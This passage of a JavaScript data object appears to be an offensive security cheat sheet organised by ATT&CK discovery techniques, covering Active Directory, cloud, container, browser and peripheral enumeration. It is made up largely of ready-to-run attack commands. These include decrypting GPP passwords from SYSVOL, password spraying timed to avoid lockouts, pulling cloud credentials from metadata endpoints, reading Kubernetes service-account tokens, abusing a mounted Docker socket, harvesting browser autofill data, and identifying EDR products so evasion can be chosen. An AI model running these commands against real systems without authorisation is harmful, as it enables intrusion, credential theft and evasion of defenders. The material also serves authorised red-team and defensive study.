        "BloodHound delegation queries:\n# Cypher: MATCH (c:Computer) WHERE c.unconstraineddelegation=true RETURN c\n# Cypher: MATCH (c:Computer) WHERE c.allowedtodelegate IS NOT NULL RETURN c,c.allowedtodelegate\n# Look for: AllowedToDelegate edges in BloodHound graph\n# Shortest path: compromised account → delegation account → DA"
      ]
    },
    {
      name: "Permission Discovery",
      id: "T1222.ACL",
      summary: "dacledit • BH ACL edges • Get-ACL • ADACLScanner",
      description: "Enumerate Access Control Lists on AD objects to discover abusable permissions for privilege escalation",
      tags: ["dacledit", "BloodHound", "ACL", "T1222"],
      steps: [
        "Read ACLs with dacledit:\n$ dacledit.py -action read -target 'Domain Admins' -principal user -dc-ip DC_IP domain.com/user:pass\n$ dacledit.py -action read -target-dn 'DC=domain,DC=com' -dc-ip DC_IP domain.com/user:pass\n# Read full DACL for any AD object\n# Shows: ACE type, rights, inherited/explicit",
        "BloodHound ACL edge analysis:\n# ACL-related edges in BloodHound:\n# GenericAll, GenericWrite, WriteOwner, WriteDACL\n# ForceChangePassword, AddMember, AddSelf\n# AllExtendedRights, Owns\n# Query: MATCH p=(u:User)-[r:GenericAll|WriteDACL|GenericWrite]->(n) RETURN p",
        "Find interesting ACL permissions:\n$ Get-ACL 'AD:CN=Domain Admins,CN=Users,DC=domain,DC=com' | Select -Expand Access | Where {$_.IdentityReference -notmatch 'S-1-5-32|Domain Admins|Enterprise Admins|SYSTEM'}\n# Look for non-standard principals with write access to privileged groups\n$ python3 aclpwn.py -f user -ft user -t 'Domain Admins' -tt group -d domain.com --server DC_IP",
        "PowerView ACL enumeration:\n$ Get-DomainObjectACL -Identity 'Domain Admins' -ResolveGUIDs | Where {$_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteProperty|WriteDACL'}\n$ Get-DomainObjectACL -SearchBase 'DC=domain,DC=com' -ResolveGUIDs | Where {$_.IdentityReferenceName -eq 'TargetUser'}\n# Find all ACLs where TargetUser has write permissions",
        "Abusable ACL permissions reference:\n# GenericAll → reset password, add to group, RBCD, shadow creds\n# GenericWrite → modify attributes (scriptPath, servicePrincipalName)\n# WriteOwner → take ownership, then WriteDACL\n# WriteDACL → grant yourself GenericAll\n# ForceChangePassword → reset password without knowing current\n# AllExtendedRights → includes ForceChangePassword + targeted Kerberoast"
      ]
    },
    {
      name: "GPO Discovery",
      id: "T1615.enum",
      summary: "GPOdity • SharpGPOAbuse • Get-GPO • PowerView",
      description: "Enumerate Group Policy Objects to find writable GPOs, sensitive settings, and credential exposure",
      tags: ["GPOdity", "SharpGPOAbuse", "Get-GPO", "T1615"],
      steps: [
        "Enumerate all GPOs and their links:\n$ Get-GPO -All | Select DisplayName,Id,GpoStatus\n$ Get-GPInheritance -Target 'DC=domain,DC=com'\n# Map which GPOs apply to which OUs\n$ python3 GPOdity.py -u user -p pass -d domain.com --dc-ip DC_IP",
        "Find writable GPOs (current user):\n$ SharpGPOAbuse.exe --CheckLocalAdminAccess\n$ Get-GPO -All | ForEach { $acl = Get-GPPermissions -Guid $_.Id -All; $acl | Where { $_.Permission -match 'GpoEdit' -and $_.Trustee.SidType -ne 'WellKnownGroup' } | Select @{N='GPO';E={$_.DisplayName}},Trustee }\n# Writable GPO on domain/OU = code execution on all linked computers",
        "Find credentials in GPO files (GPP):\n$ findstr /s /i 'cpassword' \\\\DC_IP\\SYSVOL\\\n$ python3 Get-GPPPassword.py -xmlfile Groups.xml\n# Group Policy Preferences stored cpassword (AES encrypted with published key)\n# All domain users can read SYSVOL",
        "Enumerate GPO scripts and startup items:\n$ Get-GPO -All | ForEach { Get-GPOReport -Guid $_.Id -ReportType XML } | Select-String 'Script'\n# Find logon/logoff/startup/shutdown scripts in GPOs\n# May contain credentials or writable script paths\n$ ls \\\\DC_IP\\SYSVOL\\domain.com\\Policies\\",
        "GPO abuse paths in BloodHound:\n# BloodHound edges: GPLink (GPO linked to OU/domain)\n# GpLink + WriteProperty/GenericWrite on GPO = code exec on all objects in OU\n# Query: MATCH p=(u:User)-[r:GenericWrite]->(g:GPO) RETURN p\n# Find GPOs linked to high-value OUs (Domain Controllers, AdminOU)"
      ]
    },
    {
      name: "Group Policy Discovery",
      id: "T1615",
      summary: "Get-GPO • gpresult • GPO scripts • SYSVOL • Group Policy settings",
      description: "Enumerate Group Policy Objects to understand security configurations and find attack paths",
      tags: ["Get-GPO", "gpresult", "SYSVOL", "T1615"],
      steps: [
        "Enumerate applied GPOs:\n$ gpresult /h gpresult.html\n$ gpresult /r\n# Shows applied GPOs, their precedence, and settings\n> Get-GPResultantSetOfPolicy -ReportType HTML -Path C:\\gpresult.html\n# Comprehensive GPO report for current user/computer",
        "List all GPOs in domain:\n> Get-GPO -All | Select DisplayName,Id,GpoStatus,CreationTime,ModificationTime\n$ python3 GPOdity.py -u user -p pass -d domain.com --dc-ip DC_IP\n# Find recently modified GPOs (suspicious changes)",
        "Read GPO content from SYSVOL:\n$ ls \\\\DC_IP\\SYSVOL\\domain.com\\Policies\\\n$ Get-ChildItem -Path \\\\DC_IP\\SYSVOL -Recurse | Where {$_.Extension -in '.xml','.bat','.ps1'}\n# Script files may contain credentials\n# XML files contain policy settings",
        "Search for GPP passwords:\n$ findstr /S /I cpassword \\\\DC_IP\\SYSVOL\\\n$ python3 Get-GPPPassword.py -xmlfile \\\\DC_IP\\SYSVOL\\domain.com\\Policies\\{GUID}\\Machine\\Preferences\\Groups\\Groups.xml\n# Group Policy Preferences (GPP) store encrypted passwords\n# Encryption key published by Microsoft - trivially decryptable",
        "Identify security-relevant GPO settings:\n> Get-GPOReport -All -ReportType XML | Select-String 'ScriptSource|Logon|Password|Disable'\n# Find: logon scripts, password policies, software restrictions\n# AppLocker rules, Constrained Language Mode, LAPS settings"
      ]
    },
    {
      name: "Network Share Discovery",
      id: "T1135",
      summary: "net share • smbclient • nxc smb • ShareFinder",
      description: "Discover network shares to find sensitive data and lateral movement opportunities",
      tags: ["net share", "smbclient", "ShareFinder", "T1135"],
      steps: [
        "Windows network share discovery:\n$ net share\n$ net view \\\\192.168.1.100\n$ wmic share get Name,Path,Description\n> Get-WmiObject Win32_Share | Select Name,Path,Description",
        "PowerView network share discovery:\n> Invoke-ShareFinder -CheckShareAccess\n> Find-InterestingDomainShareFile -Include *.txt,*.xml,*.ini,*.config\n# ShareFinder: enumerate shares across domain, check accessibility",
        "netexec share enumeration:\n$ nxc smb 192.168.1.0/24 -u user -p pass --shares\n$ nxc smb 192.168.1.0/24 -u user -p pass -M spider_plus --share 'Finance'\n# spider_plus module: recursively list share content",
        "Find writable shares:\n$ nxc smb 192.168.1.0/24 -u user -p pass --shares | grep WRITE\n# Writable shares = payload delivery opportunities\n# Also: credentials stored in share files",
        "Map shares to credentials and data:\n$ smbmap -H 192.168.1.100 -u user -p pass -R --depth 5\n# Recursive listing with permissions\n# Identify: finance data, IT configs, sensitive docs"
      ]
    },
    {
      name: "Remote System Discovery",
      id: "T1018",
      summary: "nmap • net view • ping sweep • AD computer enum",
      description: "Enumerate remote systems to identify targets for lateral movement",
      tags: ["nmap", "net view", "ping sweep", "T1018"],
      steps: [
        "Active Directory computer enumeration:\n$ nxc smb DC_IP -u user -p pass --computers\n> Get-ADComputer -Filter * -Properties OperatingSystem,LastLogonDate | Select Name,OperatingSystem,LastLogonDate | Sort LastLogonDate -Descending\n$ ldapsearch -x -H ldap://DC_IP -b 'DC=domain,DC=com' '(objectClass=computer)' name operatingSystem",
        "Network ping sweep:\n$ nmap -sn 192.168.1.0/24 -oG alive_hosts.txt\n$ for i in {1..254}; do ping -c1 -W1 192.168.1.$i 2>/dev/null | grep 'bytes from'; done\n# Quick host discovery without port scanning",
        "ARP-based discovery (no network traffic to target):\n$ arp-scan --localnet\n$ netdiscover -r 192.168.1.0/24 -i eth0\n# ARP requests reveal all hosts on local segment\n# Very fast, but only works on same subnet",
        "Windows net commands:\n$ net view /domain\n$ net view /domain:TARGET_DOMAIN\n$ nxc smb 192.168.1.0/24 -u user -p pass\n# net view: lists visible machines in domain/workgroup",
        "Identify high-value targets:\n$ nxc smb 192.168.1.0/24 -u user -p pass --loggedon-users\n$ nxc smb 192.168.1.0/24 -u user -p pass --sessions\n# Find Domain Admin sessions: highest value lateral movement targets"
      ]
    },
    {
      name: "Software Discovery",
      id: "T1518",
      summary: "Installed software • security products • AV enum • version enumeration",
      description: "Enumerate installed software to identify security products, vulnerabilities, and opportunities",
      tags: ["installed software", "AV detection", "security tools", "T1518"],
      steps: [
        "Enumerate installed software (Windows):\n$ wmic product get Name,Version,InstallDate | sort\n$ reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s /v DisplayName\n$ Get-Package | Select Name,Version | Sort Name\n# Identify: security tools, vulnerable software versions",
        "Security software detection:\n$ tasklist | findstr -i 'Defender\\|CrowdStrike\\|Carbon\\|Cylance\\|SentinelOne\\|Sophos\\|McAfee\\|Symantec\\|FireEye\\|Palo Alto\\|Tanium\\|Darktrace'\n$ sc query type= all state= all | findstr -i 'Falcon\\|CSAgent\\|Cylance\\|SentinelOne\\|Cortex'\n# Critical: choose correct evasion based on security stack",
        "Linux software enumeration:\n$ dpkg -l 2>/dev/null\n$ rpm -qa 2>/dev/null\n$ snap list 2>/dev/null\n$ pip3 list 2>/dev/null\n$ gem list 2>/dev/null\n# Identify versions with known CVEs",
        "Browser and plugin enumeration:\n$ reg query 'HKCU\\Software\\Microsoft\\Internet Explorer' /v version\n$ ls '/Applications/Google Chrome.app/Contents/MacOS/'\n# Browser versions for client-side exploit selection",
        "Identify security monitoring tools:\n$ ps aux | grep -Ei 'ossec|wazuh|auditd|syslog|splunk|elastic|filebeat|logstash'\n$ systemctl list-units | grep -Ei 'ossec|wazuh|auditd|splunk|elastic'\n# Know what logging/monitoring is active\n# Choose evasion techniques accordingly"
      ]
    },
    {
      name: "Browser Bookmark Discovery",
      id: "T1217",
      summary: "Chrome bookmarks • Firefox bookmarks • IE favorites • browser history",
      description: "Enumerate browser bookmarks and history to identify target applications and infrastructure",
      tags: ["bookmarks", "browser history", "Chrome", "Firefox", "T1217"],
      steps: [
        "Chrome bookmark extraction:\n$ type '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Bookmarks'\n$ cat ~/.config/google-chrome/Default/Bookmarks\n# Bookmarks stored as JSON - reveals intranet URLs, admin portals",
        "Firefox bookmarks:\n$ sqlite3 ~/.mozilla/firefox/PROFILE/places.sqlite 'SELECT url,title FROM moz_bookmarks JOIN moz_places ON moz_bookmarks.fk=moz_places.id'\n$ sqlite3 '%APPDATA%\\Mozilla\\Firefox\\Profiles\\PROFILE\\places.sqlite' 'SELECT url FROM moz_places ORDER BY visit_count DESC LIMIT 100'",
        "Browser history for target discovery:\n$ sqlite3 ~/.config/google-chrome/Default/History 'SELECT url,title,visit_count FROM urls ORDER BY visit_count DESC LIMIT 100'\n# Most visited URLs reveal: VPN portals, internal apps, admin panels",
        "Saved form data (potential creds):\n$ sqlite3 '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Web Data' 'SELECT value FROM autofill ORDER BY count DESC LIMIT 100'\n# Autofill data may contain usernames, addresses",
        "Identify undiscovered attack surface:\n# Developer bookmarks often reveal:\n# CI/CD pipelines (Jenkins, GitLab, GitHub Enterprise)\n# Internal wiki (Confluence, SharePoint)\n# Monitoring systems (Grafana, Kibana, Prometheus)\n# Source code repositories with credentials"
      ]
    },
    {
      name: "Password Policy Discovery",
      id: "T1201",
      summary: "Lockout threshold • password complexity • spraying policy • fine-grained policy",
      description: "Enumerate password policy settings to calibrate brute force and spray attacks without triggering lockouts",
      tags: ["password policy", "lockout threshold", "fine-grained", "T1201"],
      steps: [
        "Query domain password policy:\n$ nxc smb DC_IP -u user -p pass --pass-pol\n$ net accounts /domain\n$ Get-ADDefaultDomainPasswordPolicy\n# Key values: MinPasswordLength, LockoutThreshold, LockoutObservationWindow\n# Lockout threshold 5: spray max 4 passwords before pause",
        "Fine-Grained Password Policy (PSO) enumeration:\n$ Get-ADFineGrainedPasswordPolicy -Filter *\n$ ldapsearch -H ldap://DC_IP -b 'CN=Password Settings Container,CN=System,DC=domain,DC=com' '(objectClass=msDS-PasswordSettings)'\n# PSOs can apply different policies to groups/users\n# High-value accounts may have stricter lockout policies",
        "Spray threshold calculation:\n# Safe threshold: lockout_threshold - 1 per observation_window\n# e.g., threshold=5, window=30min → max 4 sprays per 30min\n# Multiple source IPs to distribute spray attempts\n$ kerbrute passwordspray --safe -d domain.com users.txt 'Password1' --dc DC_IP\n# --safe: stops if account lockouts detected",
        "Check if account is already locked:\n$ nxc smb DC_IP -u user -p '' 2>&1 | grep -i 'locked\\|STATUS_ACCOUNT_LOCKED'\n$ Get-ADUser targetuser -Properties LockedOut,BadLogonCount,BadPwdCount\n# Check before spraying specific high-value accounts\n# LockedOut: $true means already locked — don't spray",
        "Linux/UNIX password policy:\n$ cat /etc/pam.d/common-password  # PAM complexity rules\n$ cat /etc/security/pwquality.conf  # Password quality config\n$ chage -l username  # Password age for specific user\n$ grep -E 'PASS_MAX_DAYS|PASS_MIN_DAYS|PASS_WARN_AGE' /etc/login.defs\n# Identify: expiration policies, complexity requirements"
      ]
    },
    {
      name: "Peripheral Device Discovery",
      id: "T1120",
      summary: "USB devices • printers • cameras • hardware enumeration • removable media",
      description: "Enumerate peripheral devices connected to compromised hosts for data exfiltration or pivoting opportunities",
      tags: ["USB devices", "printers", "cameras", "T1120"],
      steps: [
        "Windows peripheral enumeration:\n$ wmic path Win32_USBHub get DeviceID,Description\n$ Get-PnpDevice -PresentOnly | Where {$_.Class -in 'USB','Camera','Printer','DiskDrive'} | Select FriendlyName,Class\n$ devmgmt.msc  # GUI device manager\n# Identify: USB storage, cameras, printers, biometric devices",
        "Linux USB and peripheral discovery:\n$ lsusb  # List all USB devices\n$ lsblk  # List block devices including USB drives\n$ ls /dev/video*  # Camera devices\n$ lpstat -p  # Printers\n$ dmesg | grep -i 'usb\\|camera\\|printer' | tail -20\n# Recent hardware events",
        "Network printer enumeration:\n$ nmap -p 9100,515,631 192.168.1.0/24 -sV\n# Port 9100: JetDirect (raw printing)\n# Port 515: LPR/LPD\n# Port 631: IPP (Internet Printing Protocol)\n$ python3 PRET.py 192.168.1.100 pjl  # Printer Exploitation Toolkit",
        "Identify connected USB drives for data theft:\n$ reg query HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR /s\n$ Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\\*\\* | Select FriendlyName,ContainerID\n# Historical USB connections on this host\n# Find users who regularly bring USB drives — physical exfil target",
        "Physical access indicators:\n$ ls /dev/sd* /dev/hd*  # Look for external drives\n$ mount | grep 'usb\\|sda\\|sdb'\n$ cat /proc/scsi/scsi  # SCSI/SATA device info\n# If USB drive mounted: opportunity for data collection/exfil"
      ]
    },
    {
      name: "Cloud Service Discovery",
      id: "T1526",
      summary: "AWS service enum • Azure resource discovery • GCP service catalog • cloud footprinting",
      description: "Enumerate cloud services, configurations, and resources available in a compromised cloud environment",
      tags: ["AWS enum", "Azure discovery", "GCP enum", "T1526"],
      steps: [
        "AWS full service enumeration with Pacu:\n$ pacu\n> import_keys ACCESS_KEY SECRET_KEY\n> run iam__bruteforce_permissions\n> run ec2__enum\n> run s3__get_bucket_acls\n> run lambda__enum\n# Pacu: automated AWS exploitation framework\n# Enumerates ALL accessible services and permissions",
        "Azure resource enumeration with AzureHound:\n$ python3 bloodhound.py -c AzureAD -u user@tenant.com -p pass\n$ python3 azurehound.py -u user@tenant.com -p pass -t tenant.onmicrosoft.com\n# AzureHound: BloodHound for Azure AD\n# Maps all Azure AD relationships, permissions, attack paths",
        "GCP service discovery:\n$ gcloud projects list\n$ gcloud services list --enabled --project PROJECT_ID\n$ gcloud compute instances list --all-projects\n$ gcloud container clusters list --all-projects\n# List all enabled APIs and resources across projects",
        "Enumerate cloud IAM permissions:\n$ python3 enumerate-iam.py --access-key KEY --secret-key SECRET\n# Brute-force IAM permissions by calling each API\n# Identifies what the current identity can do\n$ python3 cloudfox.py -p default --all-checks\n# CloudFox: automated cloud attack surface discovery",
        "Cloud metadata service enumeration:\n$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE\n$ curl -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'\n$ curl -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/'\n# From any cloud instance: get credentials, network info, instance data"
      ]
    },
    {
      name: "Container and Resource Discovery",
      id: "T1613",
      summary: "Docker enum • Kubernetes cluster discovery • container network • pod enumeration",
      description: "Enumerate containers, pods, and Kubernetes resources after gaining access to a container environment",
      tags: ["Docker", "Kubernetes", "container enum", "T1613"],
      steps: [
        "Container environment detection:\n$ cat /proc/1/cgroup | grep docker\n$ ls /.dockerenv\n$ env | grep KUBERNETES\n$ cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null\n# Detect if running in Docker, K8s pod, or bare metal",
        "Kubernetes service account enumeration:\n$ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\n$ APISERVER=https://kubernetes.default.svc\n$ curl -sSk -H \"Authorization: Bearer $TOKEN\" $APISERVER/api/v1/namespaces\n$ curl -sSk -H \"Authorization: Bearer $TOKEN\" $APISERVER/api/v1/pods\n# Use mounted service account token to query K8s API",
        "Enumerate K8s RBAC permissions:\n$ kubectl auth can-i --list --as=system:serviceaccount:default:default\n$ kubectl get clusterrolebindings -o wide\n# What can the current service account do?\n# Look for: create pods, exec, get secrets, etc.",
        "Docker socket discovery:\n$ ls /var/run/docker.sock\n$ find / -name 'docker.sock' 2>/dev/null\n# Mounted Docker socket = immediate container escape\n$ docker -H unix:///var/run/docker.sock ps  # List containers\n$ docker -H unix:///var/run/docker.sock images  # List images",
        "Kubernetes network discovery:\n$ cat /etc/resolv.conf  # K8s DNS configuration\n$ nslookup kubernetes.default.svc.cluster.local\n$ curl -sSk https://kubernetes.default.svc/  # K8s API server\n# Discover internal services via K8s DNS\n$ kubectl get services --all-namespaces  # List all services"
      ]
    },
    {
      name: "Domain Trust Discovery",
      id: "T1482",
      summary: "nltest • Get-ADTrust • BloodHound trusts • forest enumeration",
      description: "Map Active Directory domain and forest trust relationships for lateral movement opportunities",
      tags: ["nltest", "Get-ADTrust", "BloodHound", "T1482"],
      steps: [
        "Enumerate domain trusts:\n$ nltest /domain_trusts /all_trusts\n$ Get-ADTrust -Filter * | Select Name,TrustDirection,TrustType,IntraForest,SIDFilteringQuarantined\n$ ldeep -u user -p pass -d domain.com -s ldap://DC_IP trusts\n# Shows all trusts: direction, type, SID filtering status",
        "BloodHound trust analysis:\n$ bloodhound-python -u user -p pass -d domain.com -c Trusts\n# Cypher query: MATCH p=(n:Domain)-[:TrustedBy]->(m:Domain) RETURN p\n# Maps all trust relationships visually",
        "Forest enumeration:\n$ Get-ADForest | Select Name,Domains,GlobalCatalogs,Sites\n$ (Get-ADForest).Domains\n$ nltest /dsgetdc: /forest\n# All domains in the forest",
        "External trust enumeration:\n$ Get-ADTrust -Filter 'TrustType -ne \"Uplevel\" -and IntraForest -eq $false'\n# External trusts connect to different forests\n# Check SID filtering: SIDFilteringQuarantined = False means vulnerable",
        "Map cross-forest attack paths:\n# Bidirectional trust + no SID filtering = potential cross-forest escalation\n# One-way trust: compromised child may not reach parent\n# BloodHound: Find Shortest Path to specific domain target"
      ]
    }
  ]
};